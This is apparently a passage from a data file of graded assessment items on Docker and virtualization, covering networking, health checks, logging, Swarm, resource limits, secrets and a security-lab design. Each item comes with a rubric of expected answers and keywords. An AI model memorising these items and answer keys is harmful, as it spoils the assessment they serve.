docker network create --subnet=172.20.0.0/16 custom-net
docker run -d --name web-custom --network custom-net -p 8081:80 nginx

# Container D: Container mode (shares network namespace)
docker run -d --name sidecar --network container:web-bridge alpine sleep 3600

# Now examine:
docker exec web-bridge ip addr
docker exec web-host ip addr
docker exec sidecar ip addr
docker exec web-bridge ss -tlnp
docker exec sidecar ss -tlnp
\`\`\`

For each container:
1. What IP address does it get and on which interface?
2. Can the external client (192.168.1.50) reach it, and how?
3. What does the \`ip addr\` and \`ss -tlnp\` output look like?
4. Explain the networking implications of container D sharing network with container A.`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "bridge-mode-explanation",
        description: "Correctly explains default bridge networking with port mapping",
        points: 2,
        keywords: ["172.17", "docker0", "bridge", "NAT", "iptables", "port mapping", "DNAT", "veth"],
        check: "Student explains bridge mode: container gets 172.17.x.x IP, traffic NAT'd via iptables, client reaches via 192.168.1.100:8080"
      },
      {
        id: "host-mode-explanation",
        description: "Correctly explains host networking mode",
        points: 2,
        keywords: ["host", "no isolation", "same namespace", "192.168.1.100", "port 80", "directly", "no NAT"],
        check: "Student explains host mode: container shares host network namespace, sees host IP, nginx binds directly to host port 80"
      },
      {
        id: "container-mode-explanation",
        description: "Explains container network namespace sharing",
        points: 2,
        keywords: ["shared namespace", "same IP", "same interface", "sidecar", "localhost", "container:web-bridge"],
        check: "Student explains sidecar shares web-bridge's network namespace: same IP, same ports visible, can communicate via localhost"
      },
      {
        id: "ss-output-understanding",
        description: "Correctly predicts ss output for shared namespace",
        points: 2,
        keywords: ["ss", "both see", "port 80", "nginx", "same network stack", "shared ports"],
        check: "Student explains that ss -tlnp on sidecar will show nginx's port 80 listener because they share the network namespace"
      }
    ],
    gaps: [
      { if_missing: "bridge-mode-explanation", gap: "docker-bridge-network-nat" },
      { if_missing: "host-mode-explanation", gap: "docker-host-network-mode" },
      { if_missing: "container-mode-explanation", gap: "docker-container-network-sharing" },
      { if_missing: "ss-output-understanding", gap: "linux-network-namespace-fundamentals" }
    ]
  }
},

// 9. health checks - fix_code - difficulty 3
{
  competencyId: "containers-infra",
  subTopic: "container-health-checks",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This docker-compose stack has problems with its health check configuration. The application keeps restarting and logs show "connection refused" errors to the database on startup. Fix the health checks and startup dependencies:

\`\`\`yaml
version: "3.8"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_DB: app
      POSTGRES_USER: app
      POSTGRES_PASSWORD: secret
    healthcheck:
      test: ["CMD", "pg_isready"]
      interval: 5s
      timeout: 5s
      retries: 3
    volumes:
      - pgdata:/var/lib/postgresql/data
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql

  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s

  api:
    image: myapp-api
    depends_on:
      - db
      - redis
    environment:
      DATABASE_URL: postgres://app:secret@db:5432/app
      REDIS_URL: redis://redis:6379
    ports:
      - "8080:8080"
    restart: always
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/health"]
      interval: 10s
      timeout: 3s
      retries: 3
      start_period: 0s

  worker:
    image: myapp-worker
    depends_on:
      - api
    environment:
      DATABASE_URL: postgres://app:secret@db:5432/app
      REDIS_URL: redis://redis:6379
    restart: always

  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
    depends_on:
      - api
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
\`\`\`

Fix:
1. The race condition causing "connection refused" errors
2. Health check configurations for each service
3. Dependency ordering to ensure services start in the correct sequence
4. Any other issues with restart policies and startup behavior`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "depends-on-condition",
        description: "Uses depends_on with condition: service_healthy",
        points: 2,
        keywords: ["condition", "service_healthy", "depends_on", "healthcheck", "wait"],
        check: "Student changes depends_on to use condition: service_healthy so services wait for dependencies to be healthy"
      },
      {
        id: "start-period",
        description: "Adds appropriate start_period for application startup",
        points: 2,
        keywords: ["start_period", "grace period", "startup", "initialization", "30s", "40s"],
        check: "Student adds a reasonable start_period to the api healthcheck (e.g., 30-60s) to allow startup time"
      },
      {
        id: "pg-isready-fix",
        description: "Fixes pg_isready to include proper connection parameters",
        points: 2,
        keywords: ["pg_isready", "-U", "app", "-d", "username", "host", "connection parameters"],
        check: "Student adds -U and/or -d flags to pg_isready for proper database connection checking"
      },
      {
        id: "curl-dependency",
        description: "Addresses curl availability in api healthcheck",
        points: 2,
        keywords: ["curl", "wget", "not installed", "available", "alpine", "healthcheck binary", "alternative"],
        check: "Student identifies that curl might not be in the api image and suggests wget or a built-in health endpoint alternative"
      }
    ],
    gaps: [
      { if_missing: "depends-on-condition", gap: "docker-compose-service-dependency-health" },
      { if_missing: "start-period", gap: "docker-healthcheck-start-period" },
      { if_missing: "pg-isready-fix", gap: "postgres-container-health-checking" },
      { if_missing: "curl-dependency", gap: "container-healthcheck-tooling" }
    ]
  }
},

// 10. container logging - trace_explain - difficulty 3
{
  competencyId: "containers-infra",
  subTopic: "container-logging",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `A production Docker setup uses the following logging configuration. Examine it and explain the log flow, potential issues, and what happens in each failure scenario:

\`\`\`json
// /etc/docker/daemon.json
{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  }
}
\`\`\`

\`\`\`yaml
# docker-compose.yml
services:
  api:
    image: myapp
    logging:
      driver: json-file
      options:
        max-size: "50m"
        max-file: "5"

  worker:
    image: myapp-worker
    # no logging config specified

  debug-tool:
    image: debug-utils
    logging:
      driver: none
\`\`\`

\`\`\`bash
# The api application writes logs like this:
console.log(JSON.stringify({ level: "info", msg: "request", path: "/api/data", duration: 45 }));
console.error(JSON.stringify({ level: "error", msg: "db timeout", query: "SELECT...", duration: 30000 }));

# Meanwhile an admin runs:
docker logs --tail 100 api
docker logs --since 2h worker
docker exec api cat /var/log/app/access.log  # app also writes to file inside container
\`\`\`

Explain:
1. What logging configuration applies to each container and why?
2. How much disk space can each container's logs consume maximum?
3. What happens to the log file inside the container (/var/log/app/access.log) if the container is recreated?
4. What is the difference between logs going to stdout vs to a file inside the container?
5. Why might "docker logs debug-tool" fail?`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "config-inheritance",
        description: "Explains logging config inheritance and override behavior",
        points: 2,
        keywords: ["daemon.json", "default", "override", "compose", "per-container", "api overrides", "worker inherits"],
        check: "Student explains: api uses its own config (50m x 5), worker inherits daemon.json defaults (10m x 3), debug-tool logs to none"
      },
      {
        id: "disk-calculation",
        description: "Calculates maximum disk usage for logs",
        points: 2,
        keywords: ["250m", "250MB", "30m", "30MB", "max-size", "max-file", "multiply", "rotation"],
        check: "Student calculates: api = 50m * 5 = 250MB max, worker = 10m * 3 = 30MB max"
      },
      {
        id: "container-filesystem-loss",
        description: "Explains log loss in container writable layer",
        points: 2,
        keywords: ["writable layer", "ephemeral", "lost", "recreated", "volume", "persistent", "destroyed"],
        check: "Student explains that /var/log/app/access.log is in the container's writable layer and is lost when the container is removed/recreated unless mounted as a volume"
      },
      {
        id: "stdout-vs-file",
        description: "Distinguishes stdout logging from file logging in containers",
        points: 2,
        keywords: ["stdout", "stderr", "docker logs", "log driver", "file inside", "not captured", "logging driver"],
        check: "Student explains stdout/stderr are captured by the Docker logging driver and accessible via docker logs, while internal files are not"
      }
    ],
    gaps: [
      { if_missing: "config-inheritance", gap: "docker-logging-driver-configuration" },
      { if_missing: "disk-calculation", gap: "docker-log-rotation-sizing" },
      { if_missing: "container-filesystem-loss", gap: "container-writable-layer-persistence" },
      { if_missing: "stdout-vs-file", gap: "container-stdout-vs-file-logging" }
    ]
  }
},

// 11. container orchestration - design_solution - difficulty 4
{
  competencyId: "containers-infra",
  subTopic: "container-orchestration",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You are deploying a web application that currently runs as a single docker-compose stack on one server. The application consists of:
- A Node.js API (stateless, CPU-heavy during image processing)
- A PostgreSQL database (stateful, ~50GB data)
- A Redis cache (stateful, but can be rebuilt)
- An nginx reverse proxy
- A background worker (processes a job queue from Redis)

Requirements:
- Handle 10x traffic spikes during events (currently ~100 req/s baseline)
- Zero-downtime deployments
- Automatic recovery from container/node failures
- Database must survive node failures
- Budget: 3 servers (4 CPU, 16GB RAM each)

Design the deployment architecture using Docker Swarm (not Kubernetes). Provide:
1. The swarm initialization and node setup
2. A complete docker-compose.yml (deploy mode) with placement constraints
3. Service scaling strategy
4. Rolling update configuration
5. How you handle the stateful services (database, redis)`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "swarm-topology",
        description: "Designs appropriate manager/worker node topology",
        points: 2,
        keywords: ["manager", "worker", "init", "join", "3 managers", "quorum", "raft", "node"],
        check: "Student designs a swarm topology with manager/worker roles and explains quorum requirements"
      },
      {
        id: "service-scaling",
        description: "Configures proper replica counts and scaling for stateless services",
        points: 2,
        keywords: ["replicas", "scale", "api", "worker", "deploy", "mode: replicated", "parallelism"],
        check: "Student scales stateless services (API, workers) across nodes with appropriate replica counts"
      },
      {
        id: "rolling-update",
        description: "Configures zero-downtime rolling updates",
        points: 2,
        keywords: ["update_config", "parallelism", "delay", "order", "start-first", "rollback", "failure_action"],
        check: "Student configures update_config with start-first order, parallelism, delay, and rollback settings"
      },
      {
        id: "stateful-placement",
        description: "Handles database placement and persistence correctly",
        points: 2,
        keywords: ["constraint", "placement", "node.labels", "volume", "persistent", "single node", "backup", "global"],
        check: "Student constrains database to a specific node using placement constraints and uses named/persistent volumes"
      },
      {
        id: "resource-limits",
        description: "Sets resource limits and reservations",
        points: 2,
        keywords: ["resources", "limits", "reservations", "cpus", "memory", "OOM", "reserve"],
        check: "Student sets resource limits and reservations to prevent OOM and ensure fair scheduling"
      }
    ],
    gaps: [
      { if_missing: "swarm-topology", gap: "docker-swarm-cluster-design" },
      { if_missing: "service-scaling", gap: "docker-swarm-service-scaling" },
      { if_missing: "rolling-update", gap: "docker-swarm-rolling-update-strategy" },
      { if_missing: "stateful-placement", gap: "docker-swarm-stateful-service-management" },
      { if_missing: "resource-limits", gap: "docker-resource-limits-reservations" }
    ]
  }
},

// 12. resource limits - design_solution - difficulty 4
{
  competencyId: "containers-infra",
  subTopic: "container-resource-limits",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You are running a multi-tenant SaaS application on a single Docker host with 8 CPUs and 32GB RAM. The stack includes:

\`\`\`yaml
services:
  api-tenant-a:
    image: saas-api
    # Tenant A: premium tier, ~500 req/s
  api-tenant-b:
    image: saas-api
    # Tenant B: basic tier, ~50 req/s
  shared-db:
    image: postgres:15
    # Shared database, ~20GB working set
  shared-redis:
    image: redis:7
    # Shared cache, ~2GB dataset
  background-jobs:
    image: saas-worker
    # CPU-intensive PDF generation
\`\`\`

Design the resource limit and isolation strategy:
1. Set CPU and memory limits/reservations for each service with justification
2. Configure cgroup settings to prevent noisy-neighbor problems
3. Handle the case where background-jobs needs burst CPU but should not starve the API
4. Set up OOM kill priority (which service should be killed last?)
5. Configure I/O limits for the database
6. Show how to monitor resource usage and set up alerts

Provide the complete docker-compose.yml with deploy.resources configuration and any additional docker run flags needed.`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "tiered-resources",
        description: "Allocates resources proportionally to tenant tiers",
        points: 2,
        keywords: ["premium", "basic", "proportional", "tenant-a more", "reservation", "limit", "tier"],
        check: "Student allocates more CPU/memory to premium tenant A than basic tenant B with justified ratios"
      },
      {
        id: "cpu-shares-vs-quota",
        description: "Uses correct CPU limiting mechanism for the use case",
        points: 2,
        keywords: ["cpu_shares", "cpus", "cpu_quota", "cpu_period", "burst", "shares", "proportional", "hard limit"],
        check: "Student distinguishes between cpu_shares (proportional, allows burst) and cpus/cpu_quota (hard limits) and applies them appropriately"
      },
      {
        id: "memory-oom-config",
        description: "Configures memory limits with OOM priority",
        points: 2,
        keywords: ["mem_limit", "memswap_limit", "oom_score_adj", "oom-kill-disable", "OOM", "priority", "swap"],
        check: "Student sets memory limits with swap restrictions and configures OOM priority (database protected, jobs killed first)"
      },
      {
        id: "io-limits",
        description: "Configures I/O limits for the database",
        points: 2,
        keywords: ["blkio", "device_read_bps", "device_write_bps", "iops", "I/O", "disk"],
        check: "Student configures block I/O limits (blkio weight, device read/write bps) for the database"
      },
      {
        id: "monitoring-setup",
        description: "Describes resource monitoring and alerting",
        points: 2,
        keywords: ["docker stats", "cAdvisor", "prometheus", "alert", "threshold", "grafana", "metrics"],
        check: "Student describes a monitoring approach using docker stats, cAdvisor, or similar with alerting thresholds"
      }
    ],
    gaps: [
      { if_missing: "tiered-resources", gap: "container-resource-allocation-strategy" },
      { if_missing: "cpu-shares-vs-quota", gap: "docker-cpu-limiting-mechanisms" },
      { if_missing: "memory-oom-config", gap: "docker-memory-limits-oom-management" },
      { if_missing: "io-limits", gap: "docker-block-io-limits" },
      { if_missing: "monitoring-setup", gap: "container-resource-monitoring" }
    ]
  }
},

// 13. secrets management - compare_contrast - difficulty 4
{
  competencyId: "containers-infra",
  subTopic: "secrets-management",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `Compare these four approaches to managing secrets in a Docker-based application. For each approach, analyze the security properties, operational complexity, and failure modes:

**Approach A: Environment variables**
\`\`\`yaml
services:
  api:
    environment:
      DB_PASSWORD: supersecret
      API_KEY: sk-live-abc123
\`\`\`

**Approach B: Docker secrets (Swarm)**
\`\`\`bash
echo "supersecret" | docker secret create db_password -
\`\`\`
\`\`\`yaml
services:
  api:
    secrets:
      - db_password
secrets:
  db_password:
    external: true
\`\`\`

**Approach C: .env file with bind mount**
\`\`\`bash
# .env.production (chmod 600, owned by root)
DB_PASSWORD=supersecret
API_KEY=sk-live-abc123
\`\`\`
\`\`\`yaml
services:
  api:
    env_file:
      - .env.production
\`\`\`

**Approach D: HashiCorp Vault integration**
\`\`\`yaml
services:
  api:
    environment:
      VAULT_ADDR: http://vault:8200
      VAULT_ROLE: api-role
    # App uses AppRole auth to fetch secrets at startup
\`\`\`

For each approach:
1. Where are secrets stored at rest? In transit? In memory?
2. Who/what can access the secrets? (other containers, host processes, docker inspect, logs)
3. How do you rotate secrets?
4. What happens if the secret store is unavailable?
5. Which approach would you recommend for a small team vs a large organization, and why?`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "env-var-risks",
        description: "Thoroughly analyzes environment variable exposure risks",
        points: 2,
        keywords: ["docker inspect", "/proc", "environ", "child process", "logs", "visible", "env", "leak"],
        check: "Student explains env vars are visible via docker inspect, /proc/PID/environ on host, inherited by child processes, and may leak into logs"
      },
      {
        id: "docker-secrets-mechanism",
        description: "Explains Docker secrets implementation and limitations",
        points: 2,
        keywords: ["tmpfs", "/run/secrets", "in-memory", "encrypted", "raft", "swarm only", "file mount"],
        check: "Student explains secrets are stored encrypted in swarm raft log, mounted as tmpfs files at /run/secrets, only available in swarm mode"
      },
      {
        id: "vault-advantages",
        description: "Explains Vault's dynamic secrets and audit capabilities",
        points: 2,
        keywords: ["dynamic", "lease", "TTL", "rotation", "audit", "AppRole", "token", "revoke"],
        check: "Student explains Vault's dynamic secret generation, automatic rotation, audit logging, and lease-based access"
      },
      {
        id: "rotation-comparison",
        description: "Compares secret rotation procedures across approaches",
        points: 2,
        keywords: ["rotate", "restart", "redeploy", "downtime", "automatic", "manual", "rolling"],
        check: "Student compares rotation: env vars need redeploy, Docker secrets need service update, .env needs restart, Vault rotates automatically"
      },
      {
        id: "recommendation",
        description: "Makes contextualized recommendations for different team sizes",
        points: 2,
        keywords: ["small team", "large", "complexity", "trade-off", "recommend", "scale", "operational burden"],
        check: "Student provides different recommendations based on team size/complexity with justified reasoning"
      }
    ],
    gaps: [
      { if_missing: "env-var-risks", gap: "container-environment-variable-security" },
      { if_missing: "docker-secrets-mechanism", gap: "docker-swarm-secrets-implementation" },
      { if_missing: "vault-advantages", gap: "hashicorp-vault-dynamic-secrets" },
      { if_missing: "rotation-comparison", gap: "secret-rotation-strategies" },
      { if_missing: "recommendation", gap: "secrets-management-strategy-selection" }
    ]
  }
},

// 14. registry/image management - design_solution - difficulty 5
{
  competencyId: "containers-infra",
  subTopic: "registry-image-management",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `You are setting up a private container registry for a security-conscious organization. The registry will serve 20 developers and a CI/CD pipeline. Requirements:
- Self-hosted (no external cloud registry)
- Images must be signed and verified before deployment
- Vulnerability scanning before images enter production
- Access control: devs can push to dev/*, only CI can push to prod/*
- Image retention policy: keep last 5 tags per repo, keep all images < 30 days
- Must work with existing Docker and docker-compose workflows
- Storage: S3-compatible object storage backend (MinIO)
- TLS required for all connections

Design the complete solution:
1. The registry deployment (docker-compose.yml with all supporting services)
2. TLS and authentication configuration
3. Content trust / image signing workflow
4. CI/CD integration for scanning and promotion
5. Garbage collection and retention automation
6. Show the commands a developer and the CI pipeline would use day-to-day`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "registry-deployment",
        description: "Provides complete registry deployment with S3 backend",
        points: 2,
        keywords: ["registry:2", "S3", "MinIO", "storage", "REGISTRY_STORAGE", "docker-compose", "config.yml"],
        check: "Student provides a working registry deployment with S3/MinIO storage backend configuration"
      },
      {
        id: "auth-tls",
        description: "Configures TLS and authentication properly",
        points: 2,
        keywords: ["TLS", "certificate", "htpasswd", "token", "auth", "basic auth", "REGISTRY_HTTP_TLS", "nginx"],
        check: "Student configures TLS certificates and an authentication mechanism (htpasswd, token-based, or external auth)"
      },
      {
        id: "image-signing",
        description: "Implements content trust / image signing",
        points: 2,
        keywords: ["DCT", "DOCKER_CONTENT_TRUST", "Notary", "cosign", "Sigstore", "signing", "verify"],
        check: "Student implements image signing using Docker Content Trust/Notary or cosign/Sigstore"
      },
      {
        id: "vulnerability-scanning",
        description: "Integrates vulnerability scanning in the pipeline",
        points: 2,
        keywords: ["Trivy", "Clair", "scan", "vulnerability", "CVE", "CI", "gate", "policy"],
        check: "Student integrates a vulnerability scanner (Trivy, Clair, Grype) with a CI gate to block vulnerable images"
      },
      {
        id: "garbage-collection",
        description: "Designs retention policy and garbage collection",
        points: 2,
        keywords: ["garbage collect", "retention", "tag", "prune", "delete", "manifest", "cron", "policy"],
        check: "Student configures registry garbage collection with a retention policy (age-based and count-based tag cleanup)"
      }
    ],
    gaps: [
      { if_missing: "registry-deployment", gap: "docker-registry-self-hosted-deployment" },
      { if_missing: "auth-tls", gap: "docker-registry-auth-tls-setup" },
      { if_missing: "image-signing", gap: "container-image-signing-verification" },
      { if_missing: "vulnerability-scanning", gap: "container-image-vulnerability-scanning" },
      { if_missing: "garbage-collection", gap: "container-registry-garbage-collection" }
    ]
  }
},

// 15. virtualization KVM/QEMU - compare_contrast - difficulty 5
{
  competencyId: "containers-infra",
  subTopic: "virtualization-kvm-qemu",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText: `You are architecting the infrastructure for a cybersecurity lab that needs to run:
- Malware analysis in isolated environments
- Vulnerable-by-design VMs (e.g., Metasploitable, DVWA)
- Network simulation (multiple VLANs, routing between segments)
- Snapshot/restore for repeatable exercises

Compare containers (Docker) vs full virtualization (KVM/QEMU) vs lightweight VMs (Firecracker/Cloud Hypervisor) for this use case:

1. **Isolation guarantees**: Compare the isolation boundary of each approach. What can a compromised workload access?
2. **Performance overhead**: CPU, memory, I/O, startup time
3. **Networking flexibility**: Can you simulate realistic multi-subnet enterprise networks?
4. **Snapshot/restore**: How does each approach handle state capture and rollback?
5. **Malware containment**: Which approach safely contains real malware (ransomware, rootkits, kernel exploits)?

Also address:
- When would you use containers INSIDE a KVM VM? What does this buy you?
- How does \`virt-manager\`/\`virsh\` compare to \`docker\` CLI for managing the lifecycle?
- What role does libvirt play in the KVM stack?

Provide a recommended architecture for the lab with justification.`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "isolation-comparison",
        description: "Accurately compares isolation boundaries of all three approaches",
        points: 2,
        keywords: ["kernel", "shared kernel", "hardware virtualization", "VMX", "namespace", "hypervisor", "escape", "cgroups"],
        check: "Student explains: containers share host kernel (namespace/cgroup isolation only), KVM provides hardware-level isolation via hypervisor, Firecracker provides minimal VM isolation"
      },
      {
        id: "malware-safety",
        description: "Correctly evaluates malware containment safety",
        points: 2,
        keywords: ["kernel exploit", "container escape", "ring 0", "host kernel", "VM escape", "hardware isolation", "rootkit"],
        check: "Student explains that containers CANNOT safely contain kernel exploits/rootkits (shared kernel), KVM is appropriate for malware analysis"
      },
      {
        id: "networking-comparison",
        description: "Compares networking capabilities for lab simulation",
        points: 2,
        keywords: ["bridge", "macvtap", "OVS", "Open vSwitch", "VLAN", "libvirt network", "virtual switch", "tap"],
        check: "Student compares networking: KVM/libvirt supports complex topologies (bridges, VLANs, OVS) more naturally than Docker networking for lab simulation"
      },
      {
        id: "snapshot-comparison",
        description: "Compares snapshot/restore capabilities",
        points: 2,
        keywords: ["snapshot", "qcow2", "backing file", "docker commit", "checkpoint", "CRIU", "virsh snapshot", "restore"],
        check: "Student compares: KVM has mature snapshot/restore (qcow2 snapshots, including memory state), Docker has commit/checkpoint (CRIU) which is less mature"
      },
      {
        id: "architecture-recommendation",
        description: "Provides a justified hybrid architecture for the lab",
        points: 2,
        keywords: ["KVM for malware", "containers for", "hybrid", "nested", "lab architecture", "recommend"],
        check: "Student recommends a hybrid approach: KVM for malware analysis and network simulation, containers for tooling/infrastructure, with clear justification"
      }
    ],
    gaps: [
      { if_missing: "isolation-comparison", gap: "container-vs-vm-isolation-boundaries" },
      { if_missing: "malware-safety", gap: "malware-analysis-isolation-requirements" },
      { if_missing: "networking-comparison", gap: "virtual-networking-kvm-vs-docker" },
      { if_missing: "snapshot-comparison", gap: "vm-container-snapshot-mechanisms" },
      { if_missing: "architecture-recommendation", gap: "security-lab-infrastructure-design" }
    ]
  }
}
,
];
